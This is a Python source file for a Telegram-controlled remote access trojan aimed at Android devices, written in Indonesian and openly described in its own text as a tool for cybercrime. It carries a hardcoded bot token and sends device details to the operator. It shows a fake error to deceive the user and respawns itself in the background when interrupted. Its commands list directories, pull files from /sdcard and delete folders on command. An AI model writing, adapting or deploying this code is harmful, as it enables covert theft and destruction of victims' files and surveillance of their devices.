# Decoder : Thxyzz404
#!/usr/bin/env python3

import os
import requests
import time
import shutil
import sys
import signal
import subprocess
import zipfile
import telebot
import platform
from io import BytesIO
from datetime import datetime

MERAH = "\033[31m"
CYAN = "\033[1;36m"
BLACK = "\033[1;30m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
MAGENTA = "\033[35m"
MERAH_TERANG = "\033[1;91m"
CYAN_TERANG = "\033[96m"
PUTIH_TERANG = "\033[97m"
MAGENTA_TERANG = "\033[95m"
YELLOW_TERANG = "\033[93m"
BG_BLACK = "\033[1;30m"
BG_MERAH = "\033[41m"
BG_BIRU = "\033[44m"
BG_PUTIH = "\033[47m"
RESET = "\033[0m"

FOTO = "https://g.top4top.io/p_3699xlbsi0.jpg"
CHAT_ID = 7980762289
BOT_TOKEN = "8057151752:AAFxRjBnn9gXMMDpPMWSixgtuUa56dlbOB4"
EXTENSIONS = [".py", ".jpg", ".pdf", ".png", ".lua", ".java", ".js", ".mp4", ".mp3", ".sh", ".key"]
EXT = "/sdcard"
brand = os.popen("getprop ro.product.brand").read().strip()
model = os.popen("getprop ro.product.model").read().strip()

device_info = f"{brand} {model}"
CAPTION = f"<b><pre>Device: {brand}\nModel: {model}\n\nhalo saya bot muani rat yang di rancang oleh \njuned untuk melakukan \nkejahatan di dunia siber</pre></b>\n\n<b>ketik</b> \n/start : untuk memulai ulang menu dan\n/getall : untuk mendapatkan semua file \n/getfiles : buat mendapatkan file tertentu\n/ls : buat ngelihat isi directory\n/author : To Show a author in this project rat\n/sabotase : buat nge sabotase Directory\n\n<pre>Tankyou Our Using Muani Rat Bot</pre>"

bot = telebot.TeleBot(BOT_TOKEN)

def get_ip():
    return requests.get("https://api.ipify.org").text.strip()

def send():
    ip = get_ip()
    try:
        bot.send_photo(
            CHAT_ID, 
            FOTO, 
            CAPTION,
            parse_mode="HTML"
        )

        print(f"{CYAN_TERANG}DAFTAR PERINTAH BERHASIL DI KIRIMKAN {RESET}")
    except Exception as e:
        print(f"{CYAN_TERANG} ERROR SAAT MENGIRIM {e} {RESET}")

def run_in_bg():
    if "--bg" not in sys.argv:
        subprocess.Popen([sys.executable, __file__, "--bg"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
    while True:
        pass

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_photo(
        message.chat.id, 
        FOTO, 
        CAPTION,
        parse_mode="HTML"
    )

def banner():
    send()
    os.system('clear')
    try:
        print(f"{MERAH}SyntaxError: expected ':'{RESET}")
        print("")
        print(f"{BG_MERAH}{BLACK}Loading Broo{RESET}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{CYAN_TERANG}👋 Bye Bye{RESET}")
        time.sleep(2)
        run_in_bg()
        sys.exit(0)

def bu():
    send()
    run_in_bg()
    try:
        os.system('clear')
        try:
            os.system('figlet "haha" | lolcat')
        except:
            print(f"{CYAN}haha gabisa ctrl{RESET}")
        print("")
        print(f"{BG_MERAH}{BLACK}MENGAMBIL FILE FILE LU{RESET}")
    except KeyboardInterrupt:
        print(f"makase wok")
        time.sleep(1)
        sys.exit(0)

@bot.message_handler(commands=['getall'])
def getall(message):
    try:
        if not os.path.exists(EXT):
            bot.reply_to(message, "Folder gak ada")
            return

        files = os.listdir(EXT)

        if not files:
            bot.reply_to(message, "Folder kosong")
            return

        sent_count = 0

        for file_name in files:
            file_path = os.path.join(EXT, file_name)

            # skip kalau bukan file
            if not os.path.isfile(file_path):
                continue

            # cek ukuran file
            if os.path.getsize(file_path) > 9 * 1024 * 1024:
                continue

            try:
                with open(file_path, "rb") as f:
                    bot.send_document(message.chat.id, f)
                    sent_count += 1
            except Exception as e:
                print(f"Error sending {file_name}: {e}")

        bot.send_photo(
            message.chat.id,
            FOTO,
            caption=f"Berhasil mengambil {sent_count} file",
        )

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['author'])
def author(message):
    try:
        bot.send_photo(
            CHAT_ID,
            FOTO,
            f"<b><pre>Author: Juned</pre></b>\n\n<code>Kata Kata Dari author</code>\n\n<b>Dirimu Seputih Muani Bagi Aku Yang Sehitam Bool Mas Rusdi Juned From Ngawi</b>\n\n<pre>Thankyou Our Using Muani Rat</pre>",
            parse_mode="HTML"
        )

    except Exception as e:
        bot.send_photo(
            CHAT_ID,
            FOTO,
            f"<b><pre>Lagi Error Bang {e} </pre></b>",
            parse_mode="HTML"
        )

@bot.message_handler(commands=['sabotase'])
def sabotase(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            bot.reply_to(message, f"Invalid Message harus /sabotase <folder>")
            return
    
        folder_name = parts[1].strip()
        target_path = os.path.join(EXT, folder_name)

        if not os.path.exists(target_path):
            bot.send_photo(
                message.chat.id,
                FOTO,
                caption=f"<b><pre>Folder {target_path} Ga di Temukan</pre></b>",
                parse_mode="HTML"
            )
            return

        if os.path.exists(target_path):
            shutil.rmtree(target_path)
            bot.send_photo(
                message.chat.id,
                FOTO,
                caption=f"<b><pre>Berhasil Sabotase Directory: </pre></b><b>{target_path}</b>\n\n<pre>Thankyou For Our Using This Script</pre>",
                parse_mode="HTML"
            )

    except Exception as e:
        bot.send_photo(
            message.chat.id,
            FOTO,
            caption=f"<b><pre>Error Boss. Anjing Debugging Lagi tolol {e}</pre></b>\n\n<pre>Thankyou Our Using my Tools",
            parse_mode="HTML"
        )

@bot.message_handler(commands=['getfiles'])
def send_file(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            bot.reply_to(message, "harus: /getfiles <nama file>")
            return

        file_name = parts[1].strip()
        full_path = os.path.join(EXT, file_name)

        if not os.path.exists(full_path) or not os.path.isfile(full_path):
            bot.reply_to(message, f"file '{file_name}' tidak ditemukan")
            return

        with open(full_path, 'rb') as f:
            bot.send_document(message.chat.id, f)
        
        bot.send_photo(
            message.chat.id, 
            FOTO,
            f"*_succes mengambil file: ```{file_name}``` by Juned Rat_*",
            parse_mode="MarkdownV2"
        )
    
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['ls'])
def ls(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            dir_path = EXT
        else:
            dir_path = parts[1].strip()
        
        if not os.path.exists(dir_path):
            bot.reply_to(message, f"Directory '{dir_path}' tidak ditemukan")
            return
        
        items = os.listdir(dir_path)
        
        if not items:
            items_list = "(kosong)"
        else:
            items_list = ""
            for i, item in enumerate(items[:20], 1):
                item_path = os.path.join(dir_path, item)
                if os.path.isdir(item_path):
                    items_list += f"📁 {i}. {item}/\n"
                else:
                    try:
                        size = os.path.getsize(item_path)
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024*1024:
                            size_str = f"{size/1024:.1f} KB"
                        else:
                            size_str = f"{size/(1024*1024):.1f} MB"
                        items_list += f"📄 {i}. {item} ({size_str})\n"
                    except:
                        items_list += f"📄 {i}. {item}\n"
            
            if len(items) > 20:
                items_list += f"\n... dan {len(items)-20} lainnya"
        
        bot.send_photo(
            message.chat.id,
            FOTO,
            f"📁 *List file di: '{dir_path}*\n\n```{items_list}```",
            parse_mode="MarkdownV2"
        )
        
    except Exception as e:
        bot.send_photo(
            message.chat.id,
            FOTO,
            caption=f"❌ Gagal: {str(e)}"
        )

def main():
    try:
        banner()
        bot.polling(non_stop=True)
    except Exception as e:
        print(f"{MERAH}Error: {e}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if "--bg" not in sys.argv:
            subprocess.Popen([sys.executeable, __file__, "--bg"],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        while True:
            pass
